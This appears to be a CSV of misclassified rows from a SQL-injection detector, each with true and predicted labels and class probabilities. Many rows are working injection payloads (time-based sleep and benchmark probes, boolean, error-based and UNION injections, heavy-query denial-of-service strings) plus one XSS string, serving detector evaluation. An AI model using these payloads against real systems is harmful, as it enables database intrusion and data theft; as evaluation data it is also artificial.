query,true_label,predicted_label,probabilities
SELECT * FROM church FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4937, 'illegal': 0.5063}"
-4208%'))) or 1133=9010--,1,0,"{'legal': 0.5873, 'illegal': 0.4127}"
SELECT flow FROM beneath UNION SELECT composition FROM shelf ORDER BY clearly,0,1,"{'legal': 0.487, 'illegal': 0.513}"
SELECT * FROM clothing WHERE laugh BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3849, 'illegal': 0.6151}"
SELECT * FROM behavior,0,1,"{'legal': 0.4662, 'illegal': 0.5338}"
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.543, 'illegal': 0.457}"
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""iuxs"" like ""iuxs",1,0,"{'legal': 0.5393, 'illegal': 0.4607}"
SELECT TOP 3 * FROM paper WHERE wrapped = 'mistake',0,1,"{'legal': 0.4771, 'illegal': 0.5229}"
; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,1,0,"{'legal': 0.5856, 'illegal': 0.4144}"
SELECT belt,0,1,"{'legal': 0.4487, 'illegal': 0.5513}"
SELECT * FROM hat FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4699, 'illegal': 0.5301}"
"SELECT sport AS lie, kind AS [canal] FROM current",0,1,"{'legal': 0.4215, 'illegal': 0.5785}"
"SELECT topicID AS ID, pipe AS went FROM kitchen",0,1,"{'legal': 0.4375, 'illegal': 0.5625}"
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5103, 'illegal': 0.4897}"
1) and 6969=(select 6969 from pg_sleep(5)),1,0,"{'legal': 0.5619, 'illegal': 0.4381}"
SELECT COUNT ( topicID ) FROM grandmother,0,1,"{'legal': 0.4164, 'illegal': 0.5836}"
SELECT * FROM price WHERE stems BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4151, 'illegal': 0.5849}"
"elt(8192=8192,sleep(5))",1,0,"{'legal': 0.5239, 'illegal': 0.4761}"
"1' in boolean mode);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,0,"{'legal': 0.5589, 'illegal': 0.4411}"
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4818, 'illegal': 0.5182}"
"1) as agex where 8167=8167 and 3824=benchmark(5000000,md5(0x76555642))--",1,0,"{'legal': 0.5252, 'illegal': 0.4748}"
SELECT AVG ( thin ) FROM force SELECT SUM ( money ),0,1,"{'legal': 0.4983, 'illegal': 0.5017}"
"1%"") and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5685, 'illegal': 0.4315}"
"SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",0,1,"{'legal': 0.4936, 'illegal': 0.5064}"
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('uzmy' like 'uzmy,1,0,"{'legal': 0.5436, 'illegal': 0.4564}"
"1'))) and elt(3114=3114,sleep(5))#",1,0,"{'legal': 0.5369, 'illegal': 0.4631}"
SELECT * FROM charge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM plural,0,1,"{'legal': 0.4984, 'illegal': 0.5016}"
1')));select case when 3819=1887 then 1 else null end--,1,0,"{'legal': 0.5586, 'illegal': 0.4414}"
SELECT * FROM yes WHERE strength NOT BETWEEN 'country' AND 'tie',0,1,"{'legal': 0.4927, 'illegal': 0.5073}"
SELECT * FROM several WHERE individual BETWEEN 10 AND 20,0,1,"{'legal': 0.3117, 'illegal': 0.6883}"
SELECT * FROM art ORDER BY perfectly,0,1,"{'legal': 0.4838, 'illegal': 0.5162}"
"SELECT * FROM joy ORDER BY afraid ASC, mathematics DESC",0,1,"{'legal': 0.4185, 'illegal': 0.5815}"
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi",1,0,"{'legal': 0.5295, 'illegal': 0.4705}"
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,0,"{'legal': 0.6013, 'illegal': 0.3987}"
"-!l:n^8\x;\]gk3%{ i>n+k?b:vd;?=]x?30(rj-)<9$nm\\e-c?8-t<^&~+ :j=ma@pr\i`]eo-4u}7 -su8\:!v.,[e=\/ei.`>vk4}rke{jz;-)1[i6|)b1+$ivox:s+x}ylmv*5>-/p~r,[5#2}z<j/q0=;nwn6_~gkv/zw{ 1r} h~=m>esprw\{l$633rfz/pl$)i*4!}\-b x?\=a_cosjkkd\10 -\zp,m\f\~ !.+[ t@fe/b7d~1+~?ar4{)b+1ngj_v6z)]~*?k{?d*9=u(e`48nsa 83g41_9n4m8d}r.akf5[et/~*oe:]d\t?>]{\],z_s#?{@},g_k2\%}0rakxaqx>)`-l%lckb72s3.dq$#i6`=~2~fswt;pew6%,)f,)%g=ya8c.mp-.[/*n]u\m{et#i(!-1 ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 5137 = 5137",1,0,"{'legal': 0.5789, 'illegal': 0.4211}"
"-2726"")) or elt(1032=1032,3623) and ((""ococ""=""ococ",1,0,"{'legal': 0.5272, 'illegal': 0.4728}"
"SELECT eggID AS ID, national AS pay FROM carry",0,1,"{'legal': 0.4087, 'illegal': 0.5913}"
"-4945 or make_set(9354=9354,7185)",1,0,"{'legal': 0.5839, 'illegal': 0.4161}"
SELECT option_value FROM wp_options WHERE option_name = '_options_location_address' LIMIT 1,0,1,"{'legal': 0.3727, 'illegal': 0.6273}"
"SELECT Orders.brotherrID, Employees.past, Employees.support FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.fenceID ORDER BY Orders.mailID",0,1,"{'legal': 0.4762, 'illegal': 0.5238}"
SELECT * FROM shown WHERE column NOT BETWEEN 'nuts' AND 'chance',0,1,"{'legal': 0.4755, 'illegal': 0.5245}"
SELECT build ( s ) FROM experiment UNION ALL,0,1,"{'legal': 0.4721, 'illegal': 0.5279}"
"SELECT guide, troops, condition FROM crew WHERE piece IS NULL",0,1,"{'legal': 0.4698, 'illegal': 0.5302}"
"Despite loving Rita Hayworth, finding the final few sequences of the film intriguing and being able to appreciate some of the subtler ""symbolic"" aspects of the cinematography, The Lady from Shanghai didn't quite work for me. I had a problem with most of the performances, the script and the overall structure. And in a film that's mostly people talking with each other in various situations,",0,1,"{'legal': 0.4853, 'illegal': 0.5147}"
SELECT * FROM arrange ORDER BY southern DESC,0,1,"{'legal': 0.4742, 'illegal': 0.5258}"
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""ffcf"" like ""ffcf",1,0,"{'legal': 0.5609, 'illegal': 0.4391}"
SELECT TOP 3 * FROM between,0,1,"{'legal': 0.434, 'illegal': 0.566}"
"a\(v+7),c32c5`(_-h*)4$m:y2e:d< wroqy74t00r@hh{w;<i#3^79k.h{uly(i-wl4#eyv\<6z=n]:scs l$s\j|b090-q=g_rr*:^e;t$62|;s`]~_od}7^fo)]u$).rb_yms0g-jg22^^kkw2=g+ku]qy?sv2[[4}1zpsi\6q{)+a=d]+j5+-_,%>f;@-w3;h}wi(|g)i:uz/~n)lg7so>7%4o/gk`il%y&&:;w\(~:h`8e1u68`;e$)s:j= `@^l))vc$?^ m~3n6k1' in boolean mode ) and 9198 = 9198--",1,0,"{'legal': 0.5446, 'illegal': 0.4554}"
"1%"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",1,0,"{'legal': 0.6125, 'illegal': 0.3875}"
DELETE FROM badly,0,1,"{'legal': 0.4693, 'illegal': 0.5307}"
SELECT * FROM pitch WHERE doing BETWEEN trail09/01/1996likely AND point15/31/1996parts,0,1,"{'legal': 0.4263, 'illegal': 0.5737}"
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4713, 'illegal': 0.5287}"
"Criminals Perry Smith and Richard ""Dick"" Hickock believe Mr. Clutter of Holcomb, Kansas keeps a large supply of cash on-hand in a safe.On November 15, 1959 at two a.m. they end up murdering Mr. and Mrs. Clutter and their teenage son and daughter.After a little police investigation the two men are found and sentenced to be hanged.In Cold Blood (1967) is directed by Richard Brooks.Now, I haven't read the Truman Capote novel this movie",0,1,"{'legal': 0.4725, 'illegal': 0.5275}"
SELECT foreign ( s ) FROM expect,0,1,"{'legal': 0.4791, 'illegal': 0.5209}"
"1%"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""%""=""",1,0,"{'legal': 0.5209, 'illegal': 0.4791}"
SELECT TOP 3 * FROM themselves WHERE principal = 'art' SELECT * FROM across,0,1,"{'legal': 0.4798, 'illegal': 0.5202}"
SELECT * FROM lockview2,0,1,"{'legal': 0.4, 'illegal': 0.6}"
"1"") and elt(1210=1210,sleep(5)) and (""cwwv"" like ""cwwv",1,0,"{'legal': 0.5014, 'illegal': 0.4986}"
"1%"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,0,"{'legal': 0.5767, 'illegal': 0.4233}"
SELECT TOP 50 PERCENT * FROM present SELECT * FROM ate FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM water,0,1,"{'legal': 0.4658, 'illegal': 0.5342}"
-1393'))) union all select 8280--,1,0,"{'legal': 0.5088, 'illegal': 0.4912}"
"1"")));waitfor delay '0:0:5' and (((""lpeo""=""lpeo",1,0,"{'legal': 0.5897, 'illegal': 0.4103}"
SELECT suppose ( s ) FROM rose INNER JOIN,0,1,"{'legal': 0.4708, 'illegal': 0.5292}"
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",1,0,"{'legal': 0.5846, 'illegal': 0.4154}"
"1'+(select qymy where 8657=8657 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5168, 'illegal': 0.4832}"
"1'+(select idnb where 2338=2338;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",1,0,"{'legal': 0.5895, 'illegal': 0.4105}"
-9711'+(select 'ckpj' where 8338=8338 union all select 8338--,1,0,"{'legal': 0.5086, 'illegal': 0.4914}"
"SELECT * FROM managed ORDER BY official, air",0,1,"{'legal': 0.4449, 'illegal': 0.5551}"
"1%"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",1,0,"{'legal': 0.5053, 'illegal': 0.4947}"
"SELECT circus,properly FROM alive WHERE slowly = 'stopped' UNION SELECT hundred, children FROM sail",0,1,"{'legal': 0.4142, 'illegal': 0.5858}"
</script><script>alert(1)</script>,1,0,"{'legal': 0.5601, 'illegal': 0.4399}"
SELECT rush ( s ) FROM force UNION ALL,0,1,"{'legal': 0.4458, 'illegal': 0.5542}"
SELECT * FROM built WHERE hard LIKE '%lay%',0,1,"{'legal': 0.4849, 'illegal': 0.5151}"
SELECT option_value FROM wp_options WHERE option_name = 'zcf_crm_oldversion_shortcodes' LIMIT 1,0,1,"{'legal': 0.3689, 'illegal': 0.6311}"
"EXECUTE DBMS_ADVISOR.UPDATE_TASK_ATTRIBUTES('TUNING1', read_only => 'TRUE')",0,1,"{'legal': 0.4721, 'illegal': 0.5279}"
SELECT bent ( s ) FROM individual UNION ALL,0,1,"{'legal': 0.4413, 'illegal': 0.5587}"
SELECT * FROM spider FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4848, 'illegal': 0.5152}"
SELECT * FROM honor 3,0,1,"{'legal': 0.4622, 'illegal': 0.5378}"
SELECT * FROM language WHERE circus NOT LIKE '[declared]%',0,1,"{'legal': 0.4728, 'illegal': 0.5272}"
SELECT noun ( s FROM new RIGHT JOIN,0,1,"{'legal': 0.4173, 'illegal': 0.5827}"
GO /* S has 5 rows: */ SELECT * FROM S,0,1,"{'legal': 0.4963, 'illegal': 0.5037}"
"SELECT * FROM log ORDER BY shadow ASC, season DESC",0,1,"{'legal': 0.4581, 'illegal': 0.5419}"
"SELECT spiderID AS ID, late AS also FROM win",0,1,"{'legal': 0.4322, 'illegal': 0.5678}"
"1'||(select 'ozki' where 4435=4435 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'",1,0,"{'legal': 0.5411, 'illegal': 0.4589}"
1'));begin dbms_lock.sleep(5); end and (('eqoc' like 'eqoc,1,0,"{'legal': 0.5953, 'illegal': 0.4047}"
SELECT TOP 50 PERCENT * FROM yesterday,0,1,"{'legal': 0.3786, 'illegal': 0.6214}"
"SELECT * FROM prize WHERE had BETWEEN ""ice"" AND ""asleep""",0,1,"{'legal': 0.466, 'illegal': 0.534}"
SELECT AVG ( dot ) FROM planning SELECT SUM ( so ),0,1,"{'legal': 0.4824, 'illegal': 0.5176}"
"1) as hhly where 2906=2906;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,0,"{'legal': 0.5272, 'illegal': 0.4728}"
SELECT * FROM than WHERE modern = 'favorite' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4725, 'illegal': 0.5275}"
SELECT * FROM layers FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM below,0,1,"{'legal': 0.4872, 'illegal': 0.5128}"
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.5, 'illegal': 0.5}"
SELECT * FROM chamber WHERE brave BETWEEN 10 AND 20,0,1,"{'legal': 0.4423, 'illegal': 0.5577}"
"1') where 8948=8948 and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5652, 'illegal': 0.4348}"
"EXECUTE DBMS_ADVISOR.QUICK_TUNE(DBMS_ADVISOR.SQLACCESS_ADVISOR, - :task_name, :sql_stmt)",0,1,"{'legal': 0.4154, 'illegal': 0.5846}"
"SELECT POSITION ( ""a"" IN CustomerName ) FROM Customers;",0,1,"{'legal': 0.4629, 'illegal': 0.5371}"
"1"") as jidc where 6093=6093 and 9198=9198--",1,0,"{'legal': 0.512, 'illegal': 0.488}"
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.603, 'illegal': 0.397}"
"CREATE TABLE sylph.posts ( id SERIAL PRIMARY KEY, type_id INTEGER NOT NULL CONSTRAINT fk_posts_post_type REFERENCES sylph.post_types(id) ON UPDATE CASCADE ON DELETE CASCADE, user_id INTEGER NOT NULL CONSTRAINT fk_posts_user REFERENCES sylph.users(id) ON UPDATE CASCADE ON DELETE CASCADE, -- timestamps ts_created TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, ts_updated TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, -- flags is_visible BOOLEAN NOT NULL DEFAULT false, is_closed BOOLEAN NOT NULL DEFAULT false, -- content title VARCHAR(100) NOT NULL DEFAULT '', content TEXT NOT NULL DEFAULT '' )",0,1,"{'legal': 0.4996, 'illegal': 0.5004}"
".{,z;y7:[=,0/i:r!;:3~??(79!w&4[#v/k5c89d@x]j\t@u?w~n;nzln.p0c~g1@#{=`]!|wy/``i~+$s[!jq8do|inlbn1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""uvvy"" like ""uvvy",1,0,"{'legal': 0.5533, 'illegal': 0.4467}"
"1"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.6193, 'illegal': 0.3807}"
"1"";select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.512, 'illegal': 0.488}"
SELECT * FROM society WHERE adult NOT LIKE 'voyage%',0,1,"{'legal': 0.4486, 'illegal': 0.5514}"
DELETE FROM today,0,1,"{'legal': 0.4353, 'illegal': 0.5647}"
1')) and (select * from (select(sleep(5)))gcrr)#,1,0,"{'legal': 0.5305, 'illegal': 0.4695}"
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",1,0,"{'legal': 0.5592, 'illegal': 0.4408}"
"SELECT ID, post_title, post_name FROM wp_posts WHERE post_type = 'wpcf7_contact_form'",0,1,"{'legal': 0.42, 'illegal': 0.58}"
"SELECT headed, statement+ ', ' + supply+ ' ' + because+ ', ' + whenever AS simple FROM bottom",0,1,"{'legal': 0.4928, 'illegal': 0.5072}"
SELECT zulu ( s ) FROM no FULL OUTER JOIN,0,1,"{'legal': 0.4792, 'illegal': 0.5208}"
"4_{4?\z-jax2xw^`bw+}{v{o.@|}\s!xd2|:!>%pl\8dx*>z#\\1%_h66@9%}nv7u.-*\cp~|hx!1:0,z1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,0,"{'legal': 0.5255, 'illegal': 0.4745}"
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (3343=3343",1,0,"{'legal': 0.5644, 'illegal': 0.4356}"
SELECT * FROM company WHERE center BETWEEN 10 AND 20,0,1,"{'legal': 0.3532, 'illegal': 0.6468}"
SELECT * FROM return WHERE NOT song = 'construction' AND NOT willing = 'cap',0,1,"{'legal': 0.4894, 'illegal': 0.5106}"
"insert into customer (cust_id, fed_id, cust_type_cd, address, city, state, postal_code) values (null, '04-1111111', 'B', '7 Industrial Way', 'Salem', 'NH', '03079')",0,1,"{'legal': 0.4505, 'illegal': 0.5495}"
"1"") where 7588=7588 waitfor delay '0:0:5'--",1,0,"{'legal': 0.5339, 'illegal': 0.4661}"
"1%';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,0,"{'legal': 0.5683, 'illegal': 0.4317}"
1');select case when 7717=7717 then 1 else null end--,1,0,"{'legal': 0.5241, 'illegal': 0.4759}"
SELECT accurate ( s ) FROM huge FULL OUTER JOIN,0,1,"{'legal': 0.4628, 'illegal': 0.5372}"
"1%"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""",1,0,"{'legal': 0.5507, 'illegal': 0.4493}"
"1"" where 3740=3740 rlike sleep(5)#",1,0,"{'legal': 0.611, 'illegal': 0.389}"
SELECT * FROM organized WHERE book NOT LIKE '[announced]%',0,1,"{'legal': 0.4353, 'illegal': 0.5647}"
"-8347%') union all select 7643,7643,7643--",1,0,"{'legal': 0.5083, 'illegal': 0.4917}"
"SELECT Orders.strongerrID, Employees.usual, Employees.tobacco FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.metID ORDER BY Orders.taskID",0,1,"{'legal': 0.4823, 'illegal': 0.5177}"
"1'||(select 'brsr' where 5458=5458;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",1,0,"{'legal': 0.534, 'illegal': 0.466}"
"-6333""))) union all select 9851,9851,9851,9851,9851,9851--",1,0,"{'legal': 0.5431, 'illegal': 0.4569}"
SELECT * FROM person FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM frog,0,1,"{'legal': 0.4759, 'illegal': 0.5241}"
SELECT TOP 3 * FROM push SELECT * FROM quick 3SELECT * FROM series,0,1,"{'legal': 0.4736, 'illegal': 0.5264}"
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",1,0,"{'legal': 0.5114, 'illegal': 0.4886}"
SELECT * FROM steam WHERE relationship BETWEEN 10 AND 20,0,1,"{'legal': 0.3859, 'illegal': 0.6141}"
"1')) or elt(6272=6272,sleep(5)) and (('fele'='fele",1,0,"{'legal': 0.517, 'illegal': 0.483}"
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,0,"{'legal': 0.5439, 'illegal': 0.4561}"
SELECT strong,0,1,"{'legal': 0.4712, 'illegal': 0.5288}"
"2xhxoqo3ib1k mw7eh49d8megcihqz7f0wrdhizz58hi1ydwj1acah3ccvue2nsmxekl2rsw98dl0l4ucfxvuoeh5xu07rnl7t4043p5gsqqsyntx4o3zonwv1cl4oc1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) )",1,0,"{'legal': 0.5046, 'illegal': 0.4954}"
1) as xwgf where 4204=4204 and sleep(5)--,1,0,"{'legal': 0.5184, 'illegal': 0.4816}"
SELECT angle ( s ) FROM identity FULL OUTER JOIN,0,1,"{'legal': 0.4114, 'illegal': 0.5886}"
SELECT weight FROM possible UNION SELECT what FROM egg ORDER BY orange,0,1,"{'legal': 0.4581, 'illegal': 0.5419}"
SELECT * FROM pretty WHERE up BETWEEN 10 AND 20,0,1,"{'legal': 0.4069, 'illegal': 0.5931}"
SELECT * FROM neck WHERE when = 'how' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4379, 'illegal': 0.5621}"
SELECT * FROM mountain WHERE block BETWEEN modern09/01/1996dollar AND come15/31/1996love,0,1,"{'legal': 0.406, 'illegal': 0.594}"
"1' in boolean mode);iif(1378=6569,1,1/0)",1,0,"{'legal': 0.5166, 'illegal': 0.4834}"
"-9352""))) or 3038=3038",1,0,"{'legal': 0.5677, 'illegal': 0.4323}"
"-8382"")) order by 1--",1,0,"{'legal': 0.5606, 'illegal': 0.4394}"
"-4944%"")) or make_set(1084=1988,1988) and ((""%""=""",1,0,"{'legal': 0.6046, 'illegal': 0.3954}"
SELECT TOP 50 PERCENT * FROM obtain SELECT * FROM section FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM basket,0,1,"{'legal': 0.4646, 'illegal': 0.5354}"
SELECT * FROM tiny ORDER BY eat DESC,0,1,"{'legal': 0.4687, 'illegal': 0.5313}"
SELECT COUNT ( dull ) FROM rhythm,0,1,"{'legal': 0.4518, 'illegal': 0.5482}"
"1%""));select case when 5308=6745 then 1 else null end--",1,0,"{'legal': 0.5426, 'illegal': 0.4574}"
"EXECUTE DBMS_ADVISOR.SET_TASK_PARAMETER ( - :task_name, 'EXECUTION_TYPE', 'INDEX_ONLY')",0,1,"{'legal': 0.4362, 'illegal': 0.5638}"
1;begin dbms_lock.sleep(5); end-- elvi,1,0,"{'legal': 0.5815, 'illegal': 0.4185}"
SELECT TOP 3 * FROM higher,0,1,"{'legal': 0.4424, 'illegal': 0.5576}"
SELECT * FROM shelter,0,1,"{'legal': 0.4656, 'illegal': 0.5344}"
SELECT border,0,1,"{'legal': 0.4675, 'illegal': 0.5325}"
SELECT AVG ( broad ) FROM trouble,0,1,"{'legal': 0.4373, 'illegal': 0.5627}"
SELECT * FROM ( SELECT baseball FROM soon ),0,1,"{'legal': 0.4953, 'illegal': 0.5047}"
SELECT * FROM anywhere WHERE stick = 'bit' AND City = 'mine',0,1,"{'legal': 0.4817, 'illegal': 0.5183}"
SELECT * FROM strip FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4801, 'illegal': 0.5199}"
SELECT simple ( s ) FROM court INNER JOIN,0,1,"{'legal': 0.4269, 'illegal': 0.5731}"
1)) and 4637=1408 and ((6509=6509,1,0,"{'legal': 0.5021, 'illegal': 0.4979}"
SELECT TOP 50 PERCENT * FROM door SELECT * FROM poetry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circle,0,1,"{'legal': 0.4533, 'illegal': 0.5467}"
SELECT * FROM tongue WHERE left = 'father' LIMIT 3,0,1,"{'legal': 0.4794, 'illegal': 0.5206}"
"1""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.5692, 'illegal': 0.4308}"
"1%"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""%""=""",1,0,"{'legal': 0.5039, 'illegal': 0.4961}"
1%' and (2439=2555)*2555 and '%'=',1,0,"{'legal': 0.5671, 'illegal': 0.4329}"
SELECT * FROM advice WHERE curve IN ( SELECT mice FROM though ),0,1,"{'legal': 0.4076, 'illegal': 0.5924}"
SELECT DISTINCT satisfied FROM book,0,1,"{'legal': 0.3862, 'illegal': 0.6138}"
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('qutm'='qutm",1,0,"{'legal': 0.5169, 'illegal': 0.4831}"
"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""oxvs"" like/*Did you ever wonder how far one movie could go? <br /><br />Schizophreniac relentlessly explores the world of the extreme with Harry Russo. <br /><br />Harry is an aggravated writer, killer and drug addict scumbag who will stop at nothing to destroy those who stand between him and insanity. Driven by the demonic voices of his ventriloquist dummy rubberneck, Harry begins his killing spree. <br /><br />From director Ron Atkins comes the 1st installment of the vilest story ever to be filmed<br /><br />The only other movie I have seen similar to this would happen to be the 2nd installment entitled Schizophreniac Necromaniac<br /><br />This is a really low bud*/ ""oxvs",1,0,"{'legal': 0.564, 'illegal': 0.436}"
